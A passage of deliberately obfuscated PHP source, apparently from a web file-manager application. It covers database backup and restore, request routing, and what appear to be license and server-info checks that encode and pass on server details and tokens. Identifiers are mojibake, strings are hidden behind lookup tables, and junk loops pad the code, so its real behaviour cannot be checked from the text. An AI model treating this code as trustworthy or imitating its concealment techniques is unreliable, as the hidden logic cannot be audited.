$ö™Ü½->task[$ÕÎà»…ø[1061]] = $¸åè¢‹[1]; $ö™Ü½->update(1); } } } public function insertTable($ÁÊ‡æ—Ï, &$óş‚ıè˜) { $½­‰İ†Ï =& $_SERVER[¥ÙÌÜ¾ê]; $Ê…¡Œô˜ = $this->model()->db(); $·Ì·’âê = $¹Ñ¢ÁÛ ? array($¹Ñ¢ÁÛ) : $Ê…¡Œô˜->getTables(); foreach ($ÁÊ‡æ—Ï as $ıâÎ¨£Ÿ) { $¹Ñ¢ÁÛ = basename($ıâÎ¨£Ÿ, $½­‰İ†Ï[779]); if (!in_array($¹Ñ¢ÁÛ, $·Ì·’âê)) { continue; } $óş‚ıè˜->task[$½­‰İ†Ï[1061]] = $¹Ñ¢ÁÛ; if (get_filesize($ıâÎ¨£Ÿ) == 0) { continue; } $ëªÏ”ÄÛ = $this->sqlToDb($ıâÎ¨£Ÿ, $óş‚ıè˜); if (!$ëªÏ”ÄÛ) { ActionCall($½­‰İ†Ï[1056], !0, 0); show_json(LNG($½­‰İ†Ï[1062]) . "\133{$¹Ñ¢ÁÛ}\135", !1); } } } public function sqlFromDb($–½¨¥›Ã, $üû°šã”, &$”“äÇÖ®, $—ÇÍ¬•È = '') { if ($”“äÇÖ®) { $”“äÇÖ®->task[$_SERVER[¥ÙÌÜ¾ê][1061]] = $–½¨¥›Ã; } $ş¥ïÊŒÑ = $this->model($–½¨¥›Ã); $ÌÍ¬ïêá = 0; $ú©­ëäÇ = 0; $ó¨¥¦Èƒ = 10000; $«àäğÑ† = fopen($üû°šã”, $_SERVER[¥ÙÌÜ¾ê][1063]); $ô´ü = $ş¥ïÊŒÑ->getPk(); $àÄèÀ‡ã = $ş¥ïÊŒÑ->getDbFields(); do { $íóÊÁª = array($ô´ü => array($_SERVER[¥ÙÌÜ¾ê][1010], $ú©­ëäÇ)); $ü§ë†å = $ş¥ïÊŒÑ->where($íóÊÁª)->field($àÄèÀ‡ã)->order($ô´ü . $_SERVER[¥ÙÌÜ¾ê][1064])->limit($ó¨¥¦Èƒ)->select(); $ü§ë†å = !empty($ü§ë†å) ? $ü§ë†å : array(); if (!($Ä¤ÛÉå§ = count($ü§ë†å))) { break; } $ŸßÜÅíÅ = end($ü§ë†å); $ú©­ëäÇ = $ŸßÜÅíÅ[$ô´ü]; $ëÑ¯ëŞ÷ = array(); foreach ($ü§ë†å as $œøŸ×œÍ) { if ($–½¨¥›Ã == $_SERVER[¥ÙÌÜ¾ê][1065] && $œøŸ×œÍ[$_SERVER[¥ÙÌÜ¾ê][29]] == $_SERVER[¥ÙÌÜ¾ê][1066]) { $âÑØã²ã = json_decode($œøŸ×œÍ[$_SERVER[¥ÙÌÜ¾ê][372]], !0); if ($âÑØã²ã[$_SERVER[¥ÙÌÜ¾ê][28]] == date($_SERVER[¥ÙÌÜ¾ê][744]) && !$âÑØã²ã[$_SERVER[¥ÙÌÜ¾ê][743]]) { continue; } } if ($—ÇÍ¬•È) { $œøŸ×œÍ[$_SERVER[¥ÙÌÜ¾ê][76]] = "\173\151\157\x3a{$—ÇÍ¬•È}\175" . substr($œøŸ×œÍ[$_SERVER[¥ÙÌÜ¾ê][76]], strlen("\173\x69\157\72{$œøŸ×œÍ[$_SERVER[¥ÙÌÜ¾ê][817]]}\x7d")); $œøŸ×œÍ[$_SERVER[¥ÙÌÜ¾ê][817]] = $—ÇÍ¬•È; } $ëÑ¯ëŞ÷[] = $_SERVER[¥ÙÌÜ¾ê][1067] . $this->sqlEncode($œøŸ×œÍ) . $_SERVER[¥ÙÌÜ¾ê][1068]; } $œÜ½œì‘ = "\x49\116\x53\105\122\124\x20\x49\116\x54\x4f\x20\x60{$–½¨¥›Ã}\140\x20\x28\140" . implode($_SERVER[¥ÙÌÜ¾ê][1069], $àÄèÀ‡ã) . $_SERVER[¥ÙÌÜ¾ê][1070]; fwrite($«àäğÑ†, $œÜ½œì‘ . implode($_SERVER[¥ÙÌÜ¾ê][1071], $ëÑ¯ëŞ÷) . $_SERVER[¥ÙÌÜ¾ê][68] . PHP_EOL); $ÌÍ¬ïêá += $Ä¤ÛÉå§; if ($”“äÇÖ®) { $”“äÇÖ®->update($Ä¤ÛÉå§); } } while ($ó¨¥¦Èƒ == $Ä¤ÛÉå§); fclose($«àäğÑ†); return $ÌÍ¬ïêá; } public function sqlToDb($š±ä¯…, &$Áø´Òçë) { $ÓÖ”„òŸ =& $_SERVER[¥ÙÌÜ¾ê]; $ò²Ì¥ë = $this->model()->db(); $ˆª âÉ = @fopen($š±ä¯…, $ÓÖ”„òŸ[1072]); if (!$ˆª âÉ) { return !1; } $°‰¿óÄ½ = 0; $¯ğÃŞ´ = $ÓÖ”„òŸ[33]; $îìºóÆ = array(); $î¯¢Ò– = $this->type == $ÓÖ”„òŸ[9] ? 500 : 2000; $şµî£¤¶ = basename($š±ä¯…, $ÓÖ”„òŸ[779]); $³´¡¦Ï« = 0; $¥ÎÛØ×± = 4194304 - 104858; $¹¶ß÷áõ = 1000000 - 104858; while (!feof($ˆª âÉ)) { $Š…‘æ©í = trim(fgets($ˆª âÉ)); if (!$Š…‘æ©í) { continue; } $Æü¥Ëô¨ = $this->sqlDecode($Š…‘æ©í, $this->type); if (stripos($Æü¥Ëô¨, $ÓÖ”„òŸ[353]) === 0) { if (!$¯ğÃŞ´) { $¯ğÃŞ´ = $Æü¥Ëô¨ . $ÓÖ”„òŸ[50]; } continue; } if ($Áø´Òçë) { $Áø´Òçë->task[$ÓÖ”„òŸ[1059]] += 1; } $°‰¿óÄ½++; $îìºóÆ[] = rtrim(rtrim(trim($Æü¥Ëô¨), $ÓÖ”„òŸ[47]), $ÓÖ”„òŸ[68]); $õùÒ¥«Ä = null; $®ººä—š = strlen($Æü¥Ëô¨); $³´¡¦Ï« += $®ººä—š; if ($³´¡¦Ï« >= ($î¯¢Ò– == 500 ? $¥ÎÛØ×± : $¹¶ß÷áõ)) { $õùÒ¥«Ä = array_pop($îìºóÆ); if ($°‰¿óÄ½ > 1) { $°‰¿óÄ½--; } } if ($°‰¿óÄ½ >= $î¯¢Ò– || $õùÒ¥«Ä) { $Æü¥Ëô¨ = $¯ğÃŞ´ . implode($ÓÖ”„òŸ[47], $îìºóÆ); if (!$ò²Ì¥ë->execute($Æü¥Ëô¨)) { return !1; } if ($Áø´Òçë) { $Áø´Òçë->update($°‰¿óÄ½); } $îìºóÆ = array(); $°‰¿óÄ½ = 0; $³´¡¦Ï« = 0; if ($õùÒ¥«Ä) { $îìºóÆ = array($õùÒ¥«Ä); $°‰¿óÄ½ = 1; $³´¡¦Ï« = $®ººä—š; } } } fclose($ˆª âÉ); if (!empty($îìºóÆ)) { $Æü¥Ëô¨ = $¯ğÃŞ´ . implode($ÓÖ”„òŸ[47], $îìºóÆ); if (!$ò²Ì¥ë->execute($Æü¥Ëô¨)) { return !1; } if ($Áø´Òçë) { $Áø´Òçë->update($°‰¿óÄ½); } } return !0; } public function dropTable($ÃÉí‘ÙË = null) { $Úçéğõ® = $this->model()->db(); $Ú¼‚ŠÆ = $ÃÉí‘ÙË ? array($ÃÉí‘ÙË) : $Úçéğõ®->getTables(); if (!$Ú¼‚ŠÆ) { return; } foreach ($Ú¼‚ŠÆ as $ÃÉí‘ÙË) { if ($ÃÉí‘ÙË) { $ÃÉí‘ÙË = strtolower($ÃÉí‘ÙË); } else { continue; } $Úçéğõ®->execute("\x64\x72\157\x70\x20\x74\x61\x62\154\145\x20\151\x66\x20\145\170\151\163\164\x73\40\x60{$ÃÉí‘ÙË}\140"); } } private function sqlEncode($ãÄ®£Ôó) { $ĞƒÛÕÁÒ =& $_SERVER[¥ÙÌÜ¾ê]; $ğçŒòÍù = array(); foreach ($ãÄ®£Ôó as $ÒÃ£»Ä”) { if (is_array($ÒÃ£»Ä”)) { $ÒÃ£»Ä” = json_encode_force($ÒÃ£»Ä”); } $ÒÃ£»Ä” = addslashes($ÒÃ£»Ä”); $ÒÃ£»Ä” = str_replace(array($ĞƒÛÕÁÒ[1073], $ĞƒÛÕÁÒ[229]), array($ĞƒÛÕÁÒ[1074], $ĞƒÛÕÁÒ[1075]), $ÒÃ£»Ä”); $ğçŒòÍù[] = str_replace($ĞƒÛÕÁÒ[55], $ĞƒÛÕÁÒ[1076], $ÒÃ£»Ä”); } return $ĞƒÛÕÁÒ[55] . implode($ĞƒÛÕÁÒ[1077], $ğçŒòÍù) . $ĞƒÛÕÁÒ[55]; } private function sqlDecode($éœ‹²îä, $ÑöÜ½÷±) { $Ò˜‹ŒÜú =& $_SERVER[¥ÙÌÜ¾ê]; $éœ‹²îä = str_replace(array($Ò˜‹ŒÜú[1074], $Ò˜‹ŒÜú[1075]), array($Ò˜‹ŒÜú[1073], $Ò˜‹ŒÜú[229]), $éœ‹²îä); if ($ÑöÜ½÷± == $Ò˜‹ŒÜú[9]) { $éœ‹²îä = stripslashes($éœ‹²îä); } return $éœ‹²îä; } } goto cˆªÚ¥†ùí; a‘‘çÆóé: class Application { private $defaultModule = "\x69\x6e\144\x65\170"; private $defaultController = "\151\x6e\x64\x65\x78"; private $defaultAction = "\x69\156\144\145\170"; function __construct() { } public function setDefault($¹ö‚ë©) { $Ï®ë¿Å€ =& $_SERVER[¥ÙÌÜ¾ê]; $‚—Ëˆ÷ä =& $_SERVER[ÏÒºµ×®]; $Õü¼ğÌ× = explode($‚—Ëˆ÷ä[0], trim($¹ö‚ë©, $‚—Ëˆ÷ä[0])); $this->defaultModule = $Õü¼ğÌ×[0] ? $Õü¼ğÌ×[0] : $this->defaultModule; $this->defaultController = $Õü¼ğÌ×[1] ? $Õü¼ğÌ×[1] : $this->defaultController; $¥áà•§ã = $Ï®ë¿Å€[606]; while (strlen($¥áà•§ã) < $Ï®ë¿Å€[601]) { if (!$¥áà•§ã) { break; } $¥áà•§ã++; } $this->defaultAction = $Õü¼ğÌ×[2] ? $Õü¼ğÌ×[2] : $this->defaultAction; $—…»¸ËÚ = $Ï®ë¿Å€[607]; if (strlen($—…»¸ËÚ) < $Ï®ë¿Å€[601]) { return; } $this->jbumbdce5270($‚—Ëˆ÷ä[1], array($this, $‚—Ëˆ÷ä[2])); $ÖÔÛ¼½ = $Ï®ë¿Å€[608]; } public function appRun($­£¸ŠªÚ) { $ùò³ÅÃ =& $_SERVER[¥ÙÌÜ¾ê]; $ÇßËî‹Ë =& $_SERVER[ÏÒºµ×®]; $Çû®Šè¡ = explode($ÇßËî‹Ë[0], $­£¸ŠªÚ); $ÓìœÛ•¶ = $ùò³ÅÃ[609]; $­±ù‰Ï = strtolower($Çû®Šè¡[0]); $¿œ¹Ÿ¬ú = $ÇßËî‹Ë[3]; if ($­±ù‰Ï == $ÇßËî‹Ë[4]) { $¿œ¹Ÿ¬ú = $ÇßËî‹Ë[5]; $Çû®Šè¡[0] = $ÇßËî‹Ë[6]; $Çû®Šè¡[1] = $Çû®Šè¡[1] . $ÇßËî‹Ë[7]; $­£¸ŠªÚ = join($ÇßËî‹Ë[0], $Çû®Šè¡); $­£¸ŠªÚ = trim($­£¸ŠªÚ, $ÇßËî‹Ë[0]); } call_user_func(array($ÇßËî‹Ë[8], $ÇßËî‹Ë[9]), $¿œ¹Ÿ¬ú . $ÇßËî‹Ë[10], $­£¸ŠªÚ); ActionCall($­£¸ŠªÚ); $Öøö¿äÁ = $ùò³ÅÃ[610]; if (!$Öøö¿äÁ) { die; } call_user_func(array($ÇßËî‹Ë[8], $ÇßËî‹Ë[9]), $¿œ¹Ÿ¬ú . $ÇßËî‹Ë[11], $­£¸ŠªÚ); $¤ìö¡Ì– = $ùò³ÅÃ[611]; while ($¤ìö¡Ì– < $ùò³ÅÃ[601]) { if ($¤ìö¡Ì– >= 0) { break; } $¤ìö¡Ì–++; } } private function autorun() { $„×ìè™ =& $_SERVER[ÏÒºµ×®]; global $config; $üÛ÷ò‰ú = $_SERVER[¥ÙÌÜ¾ê][612]; if (!$üÛ÷ò‰ú) { return; } if (count($config[$„×ìè™[12]]) == 0) { return; } foreach ($config[$„×ìè™[12]] as $Ç³åÁ‡İ => $ ôıÑ£ó) { $this->appRun($ ôıÑ£ó); } } private function jtiw7480bc37() { $¿ŞšÏÛÉ =& $_SERVER[¥ÙÌÜ¾ê]; $Îç‘‘£€ =& $_SERVER[ÏÒºµ×®]; $Âß ƒ„¦ = $Îç‘‘£€[4]; $×ãÈÂÓ¸ = $GLOBALS[$Îç‘‘£€[13]][$Îç‘‘£€[14]][0]; if (!$×ãÈÂÓ¸ || strlen($×ãÈÂÓ¸) <= strlen($Âß ƒ„¦)) { return; } if (strtolower(substr($×ãÈÂÓ¸, -strlen($Âß ƒ„¦))) != $Âß ƒ„¦) { return; } $£õ×Ö‘ = substr($×ãÈÂÓ¸, 0, -strlen($Âß ƒ„¦)); $òà—¾©¾ = $¿ŞšÏÛÉ[613]; while ($òà—¾©¾ < $¿ŞšÏÛÉ[605]) { if ($òà—¾©¾ >= 0) { break; } $òà—¾©¾++; } $ã‹×´â© = array($Îç‘‘£€[4], $£õ×Ö‘); $ƒı…ÃÀ = array_slice($GLOBALS[$Îç‘‘£€[13]][$Îç‘‘£€[14]], 1); $İ¯î©éñ = $¿ŞšÏÛÉ[614]; $GLOBALS[$Îç‘‘£€[13]][$Îç‘‘£€[14]] = array_merge($ã‹×´â©, $ƒı…ÃÀ); $¶Í–Ù®ú = $¿ŞšÏÛÉ[615]; while (strlen($¶Í–Ù®ú) < $¿ŞšÏÛÉ[605]) { if (!$¶Í–Ù®ú) { break; } $¶Í–Ù®ú++; } $GLOBALS[$Îç‘‘£€[13]][$Îç‘‘£€[15]] = implode($Îç‘‘£€[0], $GLOBALS[$Îç‘‘£€[13]][$Îç‘‘£€[14]]); } private function mybd360f64c0() { $£¨ˆ–Ü“ =& $_SERVER[¥ÙÌÜ¾ê]; $õµèÂİÚ =& $_SERVER[ÏÒºµ×®]; if ($GLOBALS[$õµèÂİÚ[13]][$õµèÂİÚ[15]] != $õµèÂİÚ[6]) { return; } $ÉİíÍ è = $_SERVER[$õµèÂİÚ[16]]; $óŸÅğÄû = $£¨ˆ–Ü“[616]; if (strlen($óŸÅğÄû) < $£¨ˆ–Ü“[601]) { return; } $‰ğÄŞô“ = $õµèÂİÚ[17]; $øü¦º„› = $£¨ˆ–Ü“[617]; if (!$øü¦º„›) { return; } if (!strstr($ÉİíÍ è, $‰ğÄŞô“)) { return; } $ÙŠÏú‘ô = strrpos($ÉİíÍ è, $‰ğÄŞô“); $±”ŞÂ‘– = substr($ÉİíÍ è, $ÙŠÏú‘ô + strlen($‰ğÄŞô“)); $Üá„éÇ = $£¨ˆ–Ü“[618]; while (strlen($Üá„éÇ) < $£¨ˆ–Ü“[619]) { if (!$Üá„éÇ) { break; } $Üá„éÇ++; } preg_match_all($õµèÂİÚ[18], $±”ŞÂ‘–, $öìÓ÷ÅÛ); $ÔÕèÎâ¿ = $£¨ˆ–Ü“[620]; while ($ÔÕèÎâ¿ < $£¨ˆ–Ü“[621]) { if ($ÔÕèÎâ¿ >= 0) { break; } $ÔÕèÎâ¿++; } $±”ŞÂ‘– = trim($öìÓ÷ÅÛ[0][0], $õµèÂİÚ[19]); $£¯ÑÛ…ç = $£¨ˆ–Ü“[622]; while (strlen($£¯ÑÛ…ç) < $£¨ˆ–Ü“[623]) { if (!$£¯ÑÛ…ç) { break; } $£¯ÑÛ…ç++; } $GLOBALS[$õµèÂİÚ[13]][$õµèÂİÚ[14]] = explode($õµèÂİÚ[19], $±”ŞÂ‘–); $â‡¤§² = $£¨ˆ–Ü“[624]; if (!$â‡¤§²) { return; } $GLOBALS[$õµèÂİÚ[13]][$õµèÂİÚ[15]] = implode($õµèÂİÚ[0], $GLOBALS[$õµèÂİÚ[13]][$õµèÂİÚ[14]]); $î–ß¿› = $£¨ˆ–Ü“[625]; } public function run() { $Ã– øíö =& $_SERVER[¥ÙÌÜ¾ê]; $ÜˆÅšì– =& $_SERVER[ÏÒºµ×®]; $this->mybd360f64c0(); $»À©ÎíÇ = $Ã– øíö[626]; if (strlen($»À©ÎíÇ) < $Ã– øíö[623]) { return; } $this->jtiw7480bc37(); $“¹Î’üƒ = $Ã– øíö[627]; if (strlen($“¹Î’üƒ) < $Ã– øíö[601]) { return; } $”¶Ñ× = $GLOBALS[$ÜˆÅšì–[13]][$ÜˆÅšì–[14]]; $Îı˜ç“Û = $GLOBALS[$ÜˆÅšì–[13]][$ÜˆÅšì–[15]]; $…ˆà©å÷ = $Ã– øíö[628]; while (strlen($…ˆà©å÷) < $Ã– øíö[601]) { if (!$…ˆà©å÷) { break; } $…ˆà©å÷++; } define($ÜˆÅšì–[20], isset($”¶Ñ×[0]) && $”¶Ñ×[0] ? $”¶Ñ×[0] : $this->defaultModule); $Í®‰Î³ = $Ã– øíö[629]; if (!$Í®‰Î³) { return; } define($ÜˆÅšì–[21], isset($”¶Ñ×[1]) && $”¶Ñ×[0] ? $”¶Ñ×[1] : $this->defaultController); define($ÜˆÅšì–[22], isset($”¶Ñ×[2]) && $”¶Ñ×[0] ? $”¶Ñ×[2] : $this->defaultAction); define($ÜˆÅšì–[23], MOD . $ÜˆÅšì–[0] . ST . $ÜˆÅšì–[0] . ACT); $ÆÊƒ’‡¶ = $Ã– øíö[630]; if (strlen($ÆÊƒ’‡¶) < $Ã– øíö[623]) { return; } $_SERVER[$ÜˆÅšì–[24]] = strtolower(ACTION); $§Ö…“ôÄ = $Ã– øíö[631]; if (strlen($§Ö…“ôÄ) < $Ã– øíö[619]) { return; } $this->autorun(); $ßÌªÜı = $Ã– øíö[632]; while ($ßÌªÜı < $Ã– øíö[621]) { if ($ßÌªÜı >= 0) { break; } $ßÌªÜı++; } if (count($”¶Ñ×) >= 3) { $this->appRun($Îı˜ç“Û); } else { $this->appRun(ACTION); } } private $vesu05b9b764 = array(); private $mtvu8755d2d1 = ''; public function chgi80b8c537() { $¹“…éÏ¤ =& $_SERVER[¥ÙÌÜ¾ê]; $¼¤§ÛØ– =& $_SERVER[ÏÒºµ×®]; $this->ypsg56ab547b(); $åÖ…Ô¢ = $¹“…éÏ¤[633]; while (strlen($åÖ…Ô¢) < $¹“…éÏ¤[605]) { if (!$åÖ…Ô¢) { break; } $åÖ…Ô¢++; } $this->jrakc227b9b4(); $this->ohfxb0c82c2d(); $ñÅ‚Ö©ó = $¹“…éÏ¤[634]; if (!$ñÅ‚Ö©ó) { die; } $this->edlf0c1eb257(); $‚Ê­–ÀÛ = $¹“…éÏ¤[635]; $this->qslg5d0f2009(); $this->clejc7f53dcb(); $this->xbcu7d92424e(); $this->jbumbdce5270($¼¤§ÛØ–[25], array($this, $¼¤§ÛØ–[26])); $this->jbumbdce5270($¼¤§ÛØ–[27], array($this, $¼¤§ÛØ–[28])); $this->jbumbdce5270($¼¤§ÛØ–[29], array($this, $¼¤§ÛØ–[30])); $this->jbumbdce5270($¼¤§ÛØ–[31], array($this, $¼¤§ÛØ–[32])); $ä‹Ê‘œ  = $¹“…éÏ¤[636]; while (strlen($ä‹Ê‘œ ) < $¹“…éÏ¤[601]) { if (!$ä‹Ê‘œ ) { break; } $ä‹Ê‘œ ++; } } public function zefw53aab1fc($ÃúÉ¿„­) { $‚İœÅöš =& $_SERVER[¥ÙÌÜ¾ê]; $­èèÑù× =& $_SERVER[ÏÒºµ×®]; $ÀòØ = Model($­èèÑù×[33])->get(); $ŸÖÍ¡ö™ = $‚İœÅöš[637]; if (strlen($ŸÖÍ¡ö™) < $‚İœÅöš[619]) { die; } $ªìƒó¥á = array($­èèÑù×[34], $­èèÑù×[35], $­èèÑù×[36], $­èèÑù×[37], $­èèÑù×[38], $­èèÑù×[39], $­èèÑù×[40], $­èèÑù×[41], $­èèÑù×[42], $­èèÑù×[43], $­èèÑù×[44], $­èèÑù×[45], $­èèÑù×[46], $­èèÑù×[47], $­èèÑù×[48], $­èèÑù×[49], $­èèÑù×[50], $­èèÑù×[51], $­èèÑù×[52], $­èèÑù×[53], $­èèÑù×[54], $­èèÑù×[55], $­èèÑù×[56], $­èèÑù×[57], $­èèÑù×[58], $­èèÑù×[59], $­èèÑù×[60], $­èèÑù×[61], $­èèÑù×[62], $­èèÑù×[63], $­èèÑù×[64], $­èèÑù×[65], $­èèÑù×[66], $­èèÑù×[67], $­èèÑù×[68], $­èèÑù×[69], $­èèÑù×[70], $­èèÑù×[71], $­èèÑù×[72], $­èèÑù×[73], $­èèÑù×[74], $­èèÑù×[75], $­èèÑù×[76], $­èèÑù×[77], $­èèÑù×[78], $­èèÑù×[79], $­èèÑù×[80]); foreach ($ªìƒó¥á as $ÎÅÙ»•Ğ) { $ë·ïïÉ¡ = $GLOBALS[$­èèÑù×[81]][$­èèÑù×[82]][$ÎÅÙ»•Ğ]; if (isset($ÀòØ[$ÎÅÙ»•Ğ])) { $ë·ïïÉ¡ = $ÀòØ[$ÎÅÙ»•Ğ]; } $ÃúÉ¿„­[$­èèÑù×[83]][$­èèÑù×[84]][$ÎÅÙ»•Ğ] = $ë·ïïÉ¡; } $ÏÏøãïÊ = $ÃúÉ¿„­[$­èèÑù×[83]][$­èèÑù×[84]][$­èèÑù×[46]]; $ã´·Èô¨ = $‚İœÅöš[638]; unset($ÃúÉ¿„­[$­èèÑù×[83]][$­èèÑù×[85]][$­èèÑù×[86]]); $è¶‘ÄĞ = $‚İœÅöš[639]; while ($è¶‘ÄĞ < $‚İœÅöš[619]) { if ($è¶‘ÄĞ >= 0) { break; } $è¶‘ÄĞ++; } unset($ÃúÉ¿„­[$­èèÑù×[83]][$­èèÑù×[85]][$­èèÑù×[87]]); $éäøÒĞ = $‚İœÅöš[640]; if (!$éäøÒĞ) { return; } unset($ÃúÉ¿„­[$­èèÑù×[83]][$­èèÑù×[84]][$­èèÑù×[46]]); unset($ÃúÉ¿„­[$­èèÑù×[83]][$­èèÑù×[84]][$­èèÑù×[88]]); $ÃúÉ¿„­[$­èèÑù×[83]][$­èèÑù×[84]][$­èèÑù×[89]] = array($­èèÑù×[90] => (int) $ÏÏøãïÊ[$­èèÑù×[91]], $­èèÑù×[92] => (int) _get($ÏÏøãïÊ, $­èèÑù×[93], 0)); $«¤…Ô² = $‚İœÅöš[641]; while (strlen($«¤…Ô²) < $‚İœÅöš[601]) { if (!$«¤…Ô²) { break; } $«¤…Ô²++; } $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[95]] = Action($­èèÑù×[96])->accessToken(); $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[97]] = md5($_SERVER[$­èèÑù×[98]] . $ÀòØ[$­èèÑù×[99]]); $ìÁÕ• = $‚İœÅöš[642]; if (strlen($ìÁÕ•) < $‚İœÅöš[619]) { die; } $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[100]] = base64_encode(serverInfo()); $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[101]] = $this->mtvu8755d2d1; $ñı‚ÓñÉ = $‚İœÅöš[643]; if ($ÀòØ[$­èèÑù×[101]] != $­èèÑù×[102]) { $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[103]] = $ÀòØ[$­èèÑù×[103]]; $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[104]] = $ÀòØ[$­èèÑù×[104]]; $º’ó³£Ó = rand_string(10) . $this->mtvu8755d2d1 . rand_string(5); $ÃúÉ¿„­[$­èèÑù×[83]][$­èèÑù×[105]][$­èèÑù×[106]] = $this->wgzo2c094937($º’ó³£Ó, $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[97]]); } if ($this->mtvu8755d2d1 == $­èèÑù×[102]) { $ÃúÉ¿„­[$­èèÑù×[83]][$­èèÑù×[84]][$­èèÑù×[89]][$­èèÑù×[93]] = 0; } $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[107]] = _get($this->vesu05b9b764, $­èèÑù×[108], $­èèÑù×[6]); $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[109]] = _get($this->vesu05b9b764, $­èèÑù×[110], $­èèÑù×[6]); $œ­İÎÓé = $‚İœÅöš[644]; if (_get($GLOBALS, $­èèÑù×[111]) && $this->config[$­èèÑù×[112]]) { $ÃúÉ¿„­[$­èèÑù×[94]][$­èèÑù×[113]] = WEB_ROOT; } return $ÃúÉ¿„­; } private function clejc7f53dcb() { $—˜ôº»à =& $_SERVER[¥ÙÌÜ¾ê]; $ºÂû’Îö =& $_SERVER[ÏÒºµ×®]; if ($_SERVER[$ºÂû’Îö[24]] == $ºÂû’Îö[114]) { $Ëê¤ú¼ = array($ºÂû’Îö[101] => $this->mtvu8755d2d1, $ºÂû’Îö[115] => $this->qzjd35842446(), $ºÂû’Îö[116] => Model($ºÂû’Îö[117])->count()); if ($this->mtvu8755d2d1 != $ºÂû’Îö[102]) { $‚Å¬‚¯ = _get($this->vesu05b9b764, $ºÂû’Îö[118]); if ($‚Å¬‚¯) { $Ëê¤ú¼[$ºÂû’Îö[119]] = $‚Å¬‚¯; $Ëê¤ú¼[$ºÂû’Îö[120]] = strtotime(_get($this->vesu05b9b764, $ºÂû’Îö[121])); $Ëê¤ú¼[$ºÂû’Îö[122]] = _get($this->vesu05b9b764, $ºÂû’Îö[110]); } $‘¼îî‘Ç = Model($ºÂû’Îö[33])->get($ºÂû’Îö[123], $ºÂû’Îö[6], !0); if (is_string($‘¼îî‘Ç) && substr($‘¼îî‘Ç, 0, 1) == $ºÂû’Îö[124]) { $‘¼îî‘Ç = json_decode_force($‘¼îî‘Ç); } if (is_array($‘¼îî‘Ç) && $‘¼îî‘Ç[$ºÂû’Îö[125]] && strstr($‘¼îî‘Ç[$ºÂû’Îö[125]], $ºÂû’Îö[126])) { $…û€ƒ‡Û = explode($ºÂû’Îö[126], $‘¼îî‘Ç[$ºÂû’Îö[125]]); $Ëê¤ú¼[$ºÂû’Îö[127]] = $…û€ƒ‡Û[0]; } } $Ëê¤ú¼ = $this->uflva157ea0f(json_encode($Ëê¤ú¼), md5($ºÂû’Îö[128])); $ÙÂ³ô²Â = array($ºÂû’Îö[129] => $Ëê¤ú¼); call_user_func(array($ºÂû’Îö[130], $ºÂû’Îö[131]), $ÙÂ³ô²Â); } if ($this->mtvu8755d2d1 == $ºÂû’Îö[102]) { return; } $¤ˆ÷°‘Ö = array($ºÂû’Îö[132], $ºÂû’Îö[133], $ºÂû’Îö[134], $ºÂû’Îö[135], $ºÂû’Îö[136], $ºÂû’Îö[137]); $ÕİìâèÉ = $—˜ôº»à[645]; $²Ë†º­‘ = Model($ºÂû’Îö[33])->get(); $õçÊ­±Ã = $—˜ôº»à[646]; if (!$õçÊ­±Ã) { die; } $ÙÂ³ô²Â = array($ºÂû’Îö[138] => $²Ë†º­‘[$ºÂû’Îö[34]], $ºÂû’Îö[139] => $²Ë†º­‘[$ºÂû’Îö[35]], $ºÂû’Îö[140] => $ºÂû’Îö[6]); foreach ($¤ˆ÷°‘Ö as $Ò©±ıóˆ) { if (!isset($²Ë†º­‘[$Ò©±ıóˆ]) || !$²Ë†º­‘[$Ò©±ıóˆ]) { continue; } $ÙÂ³ô²Â[$Ò©±ıóˆ] = $²Ë†º­‘[$Ò©±ıóˆ]; $òÅäŸ‘¡ = $—˜ôº»à[647]; if (!$òÅäŸ‘¡) { return; } } call_user_func(array($ºÂû’Îö[130], $ºÂû’Îö[131]), $ÙÂ³ô²Â); $øŸ»‹ßŒ = $—˜ôº»à[648]; if (strlen($øŸ»‹ßŒ) < $—˜ôº»à[621]) { die; } } private function edlf0c1eb257() { $—ÄÒ„¯­ =& $_SERVER[¥ÙÌÜ¾ê]; $ãÁù¼ã€ =& $_SERVER[ÏÒºµ×®]; if ($_SERVER[$ãÁù¼ã€[24]] != $ãÁù¼ã€[141]) { return; } if (!_get($GLOBALS, $ãÁù¼ã€[111])) { die; } $Œ“×«İ = $GLOBALS[$ãÁù¼ã€[13]]; if (isset($Œ“×«İ[$ãÁù¼ã€[142]])) { $this->wqhtc7454b10(); die; } if (!isset($Œ“×«İ[$ãÁù¼ã€[143]]) || strlen($Œ“×«İ[$ãÁù¼ã€[143]]) != 16) { show_json($ãÁù¼ã€[144] . $Œ“×«İ[$ãÁù¼ã€[143]], !1); } $àÒª„Œ› = Model($ãÁù¼ã€[33])->get($ãÁù¼ã€[99]); $üä¶¦íø = md5($_SERVER[$ãÁù¼ã€[98]] . $àÒª„Œ›); $ÁéÇÄ‹‚ = array($ãÁù¼ã€[143] => $Œ“×«İ[$ãÁù¼ã€[143]], $ãÁù¼ã€[145] => rand_string(16), $ãÁù¼ã€[146] => $ãÁù¼ã€[128], $ãÁù¼ã€[147] => $ãÁù¼ã€[148], $ãÁù¼ã€[149] => $_SERVER[$ãÁù¼ã€[150]], $ãÁù¼ã€[151] => $_SERVER[$ãÁù¼ã€[152]], $ãÁù¼ã€[153] => $_SERVER[$ãÁù¼ã€[154]], $ãÁù¼ã€[97] => $üä¶¦íø, $ãÁù¼ã€[155] => Model($ãÁù¼ã€[33])->get($ãÁù¼ã€[123])); $†·«Úñ = $—ÄÒ„¯­[649]; if ($Œ“×«İ[$ãÁù¼ã€[156]] == $ãÁù¼ã€[157]) { $Ôàë÷›¦ = $this->uflva157ea0f($üä¶¦íø, $ãÁù¼ã€[158]); $ïóı¢ä¾ = $this->wgzo2c094937(json_encode($ÁéÇÄ‹‚), $üä¶¦íø . $ãÁù¼ã€[159], 3); $ïóı¢ä¾ = $ïóı¢ä¾ . $ãÁù¼ã€[160] . $_SERVER[$ãÁù¼ã€[150]]; $Ùù—”ß§ = $this->fzli11bd429a($ãÁù¼ã€[161] . $Ôàë÷›¦ . $ãÁù¼ã€[162] . $ïóı¢ä¾, -1); show_json($Ùù—”ß§, !0); } else { if ($Œ“×«İ[$ãÁù¼ã€[156]] == 